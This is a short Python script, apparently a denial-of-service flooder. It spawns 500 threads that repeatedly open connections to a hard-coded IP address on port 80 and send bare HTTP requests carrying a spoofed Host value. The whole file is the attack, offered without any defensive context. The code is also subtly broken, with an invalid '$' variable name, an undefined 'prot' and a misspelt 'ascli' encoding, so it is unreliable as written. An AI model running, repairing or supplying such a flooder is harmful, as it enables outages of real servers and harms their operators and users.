import threading
import socket

target = '118.98.77.121'
port = 80
fake_ip = '182.21.20.32'

already_connected = 0

def attack():
	while True:
		$ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		$.connect((target, prot))
		$.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascli'), (target, port))
		$.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascli'), (target, port))
		$.close()

		global already_connected
		already_connected += 1
		if already_connected % 500 == 0:
			print(already_connected)

for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()

